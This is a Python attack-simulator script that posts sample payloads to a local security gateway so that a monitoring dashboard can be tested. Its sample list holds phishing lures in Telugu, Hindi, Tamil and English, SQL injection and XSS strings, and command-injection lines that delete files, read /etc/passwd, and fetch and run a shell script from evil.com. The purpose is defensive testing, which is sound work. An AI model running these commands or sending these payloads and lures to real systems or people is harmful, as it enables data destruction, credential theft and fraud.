"""
AegisAgent-AI :: Attack Simulator
Fires a mix of multilingual phishing, SQLi, XSS, and command-injection
payloads at the gateway so you can watch the SOC dashboard react live.

Usage:
    python3 scripts/simulate_attacks.py [--url http://localhost:8000] [--count 20] [--delay 0.5]
"""
import argparse
import random
import time
import urllib.request
import json

SAMPLES = [
    ("te", "మీ బ్యాంక్ ఖాతా రద్దు చేయబడింది. వెంటనే ఇక్కడ క్లిక్ చేసి పాస్‌వర్డ్ మార్చండి: http://fraud-verify.com"),
    ("hi", "आपका बैंक खाता निलंबित कर दिया गया है। तुरंत यहां क्लिक करके सत्यापित करें: http://secure-bank-update.net"),
    ("ta", "உங்கள் வங்கிக் கணக்கு முடக்கப்பட்டுள்ளது. உடனடியாக இங்கே கிளிக் செய்யவும்: http://kyc-refresh.info"),
    ("en", "Congratulations! You have won a lottery of $10,000. Claim now at http://prize-claim24.com"),
    ("en", "' OR '1'='1"),
    ("en", "'; DROP TABLE users;--"),
    ("en", "<script>alert('xss')</script>"),
    ("en", "<img src=x onerror=alert(1)>"),
    ("en", "; rm -rf / && cat /etc/passwd"),
    ("en", "$(curl http://evil.com/shell.sh | bash)"),
    ("en", "What is the weather forecast for tomorrow?"),
    ("te", "నేను రేపు ఆఫీసుకు వస్తాను"),
    ("hi", "कृपया मुझे कल की बैठक का समय बताएं"),
]


def random_ip():
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://localhost:8000")
    parser.add_argument("--count", type=int, default=20)
    parser.add_argument("--delay", type=float, default=0.6)
    args = parser.parse_args()

    for i in range(args.count):
        lang, payload = random.choice(SAMPLES)
        body = json.dumps({
            "client_ip": random_ip(),
            "language": lang,
            "payload": payload,
        }).encode()
        req = urllib.request.Request(
            f"{args.url}/api/v1/inspect", data=body,
            headers={"Content-Type": "application/json"}, method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                result = json.loads(resp.read())
                print(f"[{i+1}/{args.count}] {result['status']} :: {result['classification']} "
                      f"({result['confidence_score']:.2f}) from {result['client_ip']}")
        except Exception as e:
            print(f"[{i+1}/{args.count}] request failed: {e}")
        time.sleep(args.delay)


if __name__ == "__main__":
    main()
